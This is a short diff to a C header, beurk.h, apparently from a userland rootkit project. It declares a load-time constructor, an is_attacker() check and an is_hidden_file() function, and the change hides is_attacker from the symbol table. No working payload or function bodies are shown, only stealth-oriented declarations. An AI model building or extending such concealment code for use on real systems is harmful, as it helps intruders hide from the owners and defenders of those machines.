@@ -23,8 +23,10 @@
 #ifndef _BEURK_H_
 # define _BEURK_H_
 
+# include "config.h"
+
 # if DEBUG_LEVEL > 0
-#  define INTERNAL_API(...)
+#  define INTERNAL_API
 # else
 #  define INTERNAL_API __attribute__((visibility("hidden")))
 # endif
@@ -36,7 +38,7 @@
 void        init(void) __attribute__((constructor));
 
 /* is_attacker.c */
-int         is_attacker(void);
+int         is_attacker(void) INTERNAL_API;
 
 /* is_hidden_file.c */
 int         is_hidden_file(const char *path) INTERNAL_API;
